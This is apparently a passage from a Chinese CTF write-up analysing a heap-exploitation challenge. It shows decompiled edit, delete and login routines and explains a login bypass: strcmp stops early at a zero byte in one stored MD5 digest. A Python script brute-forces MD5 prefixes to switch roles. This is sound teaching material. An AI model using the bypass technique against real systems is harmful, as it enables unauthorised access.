<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( state-&gt;edit_times &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;No edit for you...&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">edit_1</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">edit_2</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">edit_3</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    --state-&gt;edit_times;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Mummy&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i + <span class="number">0x10</span>], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Daddy&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i + <span class="number">0x20</span>], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以修改的索引范围和可以<code>add</code>的索引范围相同。而且修改时需要有一个标志位为0。这个标志位和<code>view message</code>的标志位相同。本题限制<code>edit</code>的次数最多为8次。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete</span><span class="params">(Info *info, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">delete_1</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">delete_2</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">delete_3</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0x14</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以删除的索引范围和可以<code>add</code>的索引范围相同。删除后会将两个标志位置为1。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [rsp+70h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">88</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">         &amp;std::cout,</span><br><span class="line">         <span class="string">&quot;Please enter the identity password of the corresponding user:&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">read_n</span>(s, <span class="number">0x40</span>LL);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;What&#x27;s this?&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">MD5_initalize</span>(v5);</span><br><span class="line">  <span class="built_in">MD5_init1</span>(v5, s, v4);</span><br><span class="line">  <span class="built_in">MD5_init2</span>(v5, (__int64)v7);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v7, <span class="string">&quot;\xA2&#x27;\x90\xD5\xEA\xD5\x37\xA3\xE1\x6D\x4Fc\x17\x7F\xB2X&quot;</span>, <span class="number">0x11</span>uLL)</span><br><span class="line">    || !<span class="built_in">memcmp</span>(v7, <span class="string">&quot;R\xEC\x3C\x4An\x13\&quot;#\xCA\xF9L\xA2\xFA\x8D\x9B&#123;&quot;</span>, <span class="number">0x11</span>uLL)</span><br><span class="line">    <span class="comment">// 第三位为 &#x27;\x00&#x27;，存在提前截断。</span></span><br><span class="line">    || !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;&lt;D\x00T\x92c \xAC\xF0\xAA\x1C\xBA\x8C\xBD\x96\xDA&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)s[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span> &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Couldn&#x27;t find this password!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">MD5_initalize</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="comment">// MD5魔数</span></span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">2</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">  a1[<span class="number">3</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  a1[<span class="number">4</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  a1[<span class="number">5</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据条件爆破密码。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_string</span>(<span class="params">start_char</span>):</span><br><span class="line">    chars = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> itertools.product(chars, repeat=<span class="number">5</span>):</span><br><span class="line">        s = start_char + <span class="string">&#x27;&#x27;</span>.join(guess)</span><br><span class="line">        md5_value = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_value[:<span class="number">6</span>] == <span class="string">&#x27;3c4400&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;B&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;C&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<p>需要知道每个角色的密码，才能通过对应密码 <code>md5</code> 的比较判断，但是这里判断用的 <code>strcmp</code>，且其中有个 <code>md5</code> 值中的包含 <code>‘\x00’ </code> ，所以实际上会提前截断，而以<code> ‘\x3c\x44\x00’</code> 开头的 <code>md5</code>，对应的原值其实是有很多的，所以这里可以任意切换角色。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(state, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info1.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info1.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info1.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info1.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;state-&gt;info2, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info2.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info2.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info2.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info2.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ 